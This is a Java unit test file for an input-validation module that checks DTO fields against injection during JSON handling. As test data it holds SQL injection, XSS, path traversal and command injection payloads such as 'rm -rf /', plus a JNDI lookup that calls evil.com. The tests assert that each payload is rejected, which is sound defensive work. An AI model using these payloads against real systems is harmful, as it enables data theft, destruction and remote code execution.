package ru.sbernpf.util;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import ru.sbernpf.util.jackson.SecureValidationModule;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class SecureDtoTest {

    private final ObjectMapper mapper = new ObjectMapper()
            .registerModule(new JavaTimeModule())
            .registerModule(new SecureValidationModule());

    @SecureDto
    public static class PersonDto {
        public String name;
        public String comment;
        @DateTimeRange(notInFuture = true)
        public LocalDate birthDate;
        public LocalDate contractDate;
        @SecureField(skip = {SecurityCheck.SQL_INJECTION, SecurityCheck.XSS, SecurityCheck.COMMAND_INJECTION,
                SecurityCheck.TEMPLATE_INJECTION})
        public String password;
        public BigDecimal amount;
        public Double rate;
        public AddressDto address;
        public List<String> tags;
        public Map<String, String> attributes;
    }

    /** Без аннотации: проверяется каскадно в составе PersonDto. */
    public static class AddressDto {
        public String street;
    }

    @SecureDto
    public record RecordDto(String value, @SecureField(maxLength = 5) String code) {
    }

    @SecureDto(maxCollectionSize = 2)
    public static class SmallDto {
        public List<String> items;
    }

    private PersonDto read(String json) throws Exception {
        return mapper.readValue(json, PersonDto.class);
    }

    private SecurityCheck failedCheck(String json) {
        SecurityValidationException e = assertThrows(SecurityValidationException.class, () -> read(json));
        return e.getViolations().get(0).check();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Иванов Иван Иванович",
            "O'Brien",
            "Д'Артаньян",
            "ООО \"Ромашка\"; ИНН 7700000000",
            "Please select an option from the list or update later",
            "Tom & Jerry",
            "JavaScript: The Good Parts",
            "Цена 100% или 50 %",
            "a > b and c < d",
            "Москва, ул. Ленина, д. 1, кв. 2",
            "e-mail: test@example.com",
            "Многострочный\nтекст\tс табуляцией",
            "<b>жирный</b> и <i>курсив</i>",
            "<p>абзац</p><br><pre>код</pre>",
            "<B>Верхний регистр</B>",
            "1<2 и 3>2",
            "x &lt; y",
            "Tom &amp; Jerry",
            "AT&T",
            "https://example.com/?price&lte=5&gte=1",
            "<имя>",
            "&#1048; &#x418;"
    })
    void acceptsNormalText(String text) {
        PersonDto dto = new PersonDto();
        dto.comment = text;
        assertEquals(List.of(), new SecureValidator().validate(dto), text);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "' OR '1'='1",
            "admin'--",
            "admin' #",
            "1 OR 1=1",
            "x' AND 1=1 --",
            "1; DROP TABLE users",
            "'; delete from accounts --",
            "1 UNION SELECT username, password FROM users",
            "1 UNION/**/SELECT null",
            "1%20UNION%20SELECT%20null",
            "%2527%20OR%20%25271%2527%3D%25271",
            "1 AND SLEEP(5)",
            "1; WAITFOR DELAY '0:0:5'",
            "1' AND pg_sleep(5)",
            "SELECT * FROM information_schema.tables",
            "exec xp_cmdshell 'dir'",
            "' or true--",
            "ＵＮＩＯＮ ＳＥＬＥＣＴ 1",
            "&#39; OR 1=1 --",
            "&apos; OR &apos;1&apos;=&apos;1"
    })
    void rejectsSqlInjection(String payload) throws Exception {
        String json = mapper.writeValueAsString(Map.of("name", payload));
        SecurityValidationException e = assertThrows(SecurityValidationException.class, () -> read(json), payload);
        assertTrue(e.getViolations().stream().anyMatch(v -> v.check() == SecurityCheck.SQL_INJECTION), payload);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "java\tscript:alert(1)",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<a href=\"x\" onclick=\"steal()\">x</a>",
            "data:text/html;base64,PHNjcmlwdD4=",
            "<table>",
            "<div>x</div>",
            "</div>",
            "<a href=\"http://evil\">x</a>",
            "<h1>x</h1>",
            "<span>",
            "<td background=x>",
            "<custom-el>",
            "<em>x</em>",
            "<p style=\"color:red\">x</p>",
            "<b class=x>y</b>",
            "<b\n>x</b>",
            "<br/>",
            "<table",
            "<!DOCTYPE html>",
            "<?xml version=\"1.0\"?>",
            "＜table＞",
            "%3Ctable%3E",
            "&#60;script&#62;",
            "&#x3c;script&#x3e;",
            "&#X3C;script&#X3E;",
            "&#0000060;script&#0000062;",
            "&#60script&#62",
            "&lt;script&gt;",
            "&LT;div&GT;",
            "&ltdiv&gt",
            "&amp;lt;script&amp;gt;",
            "&amp;amp;lt;script&amp;amp;gt;",
            "%26lt%3Bscript%26gt%3B",
            "java&#115;cript:alert(1)",
            "java&Tab;script&colon;x",
            "<a href=\"java&#115;cript:x\">",
            "x&#32;onerror&equals;steal()"
    })
    void rejectsXss(String payload) throws Exception {
        String json = mapper.writeValueAsString(Map.of("comment", payload));
        SecurityValidationException e = assertThrows(SecurityValidationException.class, () -> read(json), payload);
        assertTrue(e.getViolations().stream().anyMatch(v -> v.check() == SecurityCheck.XSS), payload);
    }

    @Test
    void rejectsOtherInjections() {
        assertEquals(SecurityCheck.PATH_TRAVERSAL, failedCheck("{\"name\":\"../../etc/passwd\"}"));
        assertEquals(SecurityCheck.PATH_TRAVERSAL, failedCheck("{\"name\":\"..%2F..%2Fsecret\"}"));
        assertEquals(SecurityCheck.COMMAND_INJECTION, failedCheck("{\"name\":\"file.txt; rm -rf /\"}"));
        assertEquals(SecurityCheck.COMMAND_INJECTION, failedCheck("{\"name\":\"$(whoami)\"}"));
        assertEquals(SecurityCheck.TEMPLATE_INJECTION, failedCheck("{\"name\":\"${jndi:ldap://evil.com/a}\"}"));
        assertEquals(SecurityCheck.TEMPLATE_INJECTION, failedCheck("{\"name\":\"{{7*7}}\"}"));
    }

    @Test
    void rejectsControlCharacters() {
        assertEquals(SecurityCheck.CONTROL_CHARS, failedCheck("{\"name\":\"abc\\u0000def\"}"));
        assertEquals(SecurityCheck.CONTROL_CHARS, failedCheck("{\"name\":\"abc\\u202Edef\"}"));
    }

    @Test
    void validatesDates() throws Exception {
        String future = LocalDate.now().plusDays(10).toString();
        assertEquals(SecurityCheck.DATE_RANGE, failedCheck("{\"birthDate\":\"" + future + "\"}"));
        assertEquals(SecurityCheck.DATE_RANGE, failedCheck("{\"birthDate\":\"1850-01-01\"}"));
        assertEquals(SecurityCheck.DATE_RANGE, failedCheck("{\"contractDate\":\"9999-12-31\"}"));
        assertDoesNotThrow(() -> read("{\"birthDate\":\"1985-05-20\",\"contractDate\":\"" + future + "\"}"));
    }

    @Test
    void validatesNumbers() {
        assertEquals(SecurityCheck.NUMBER, failedCheck("{\"amount\":1e-1000}"));
        PersonDto dto = new PersonDto();
        dto.rate = Double.NaN;
        assertEquals(SecurityCheck.NUMBER, new SecureValidator().validate(dto).get(0).check());
    }

    @Test
    void validatesNestedCollectionsAndMaps() {
        SecurityValidationException e = assertThrows(SecurityValidationException.class,
                () -> read("{\"address\":{\"street\":\"<script>x</script>\"},"
                        + "\"tags\":[\"ok\",\"1' OR '1'='1\"],"
                        + "\"attributes\":{\"<script>\":\"ok\"}}"));
        List<String> paths = e.getViolations().stream().map(Violation::path).toList();
        assertTrue(paths.contains("address.street"), paths.toString());
        assertTrue(paths.contains("tags[1]"), paths.toString());
        assertTrue(paths.contains("attributes[#0]<key>"), paths.toString());
        // вредоносное значение не попадает в сообщение
        assertFalse(e.getMessage().contains("<script>"));
    }

    @Test
    void enforcesSizeLimits() {
        String longName = "a".repeat(5000);
        assertEquals(SecurityCheck.STRING_LENGTH, failedCheck("{\"name\":\"" + longName + "\"}"));
        assertThrows(SecurityValidationException.class,
                () -> mapper.readValue("{\"items\":[\"a\",\"b\",\"c\"]}", SmallDto.class));
    }

    @Test
    void fieldLevelSkipAllowsSpecialCharsInPassword() {
        assertDoesNotThrow(() -> read("{\"password\":\"p@ss'--<script>; rm ${x}\"}"));
    }

    @Test
    void worksWithRecords() {
        assertDoesNotThrow(() -> mapper.readValue("{\"value\":\"ok\",\"code\":\"12345\"}", RecordDto.class));
        SecurityValidationException e = assertThrows(SecurityValidationException.class,
                () -> mapper.readValue("{\"value\":\"ok\",\"code\":\"123456\"}", RecordDto.class));
        assertEquals("code", e.getViolations().get(0).path());
    }

    @Test
    void validatesOnSerialization() {
        PersonDto dto = new PersonDto();
        dto.name = "' OR 1=1 --";
        assertThrows(SecurityValidationException.class, () -> mapper.writeValueAsString(dto));
        dto.name = "Петров";
        assertDoesNotThrow(() -> mapper.writeValueAsString(dto));
    }

    @Test
    void validatesNestedSecureDtoInsideList() {
        assertThrows(SecurityValidationException.class,
                () -> mapper.readValue("[{\"name\":\"<script>\"}]",
                        mapper.getTypeFactory().constructCollectionType(List.class, PersonDto.class)));
    }
}
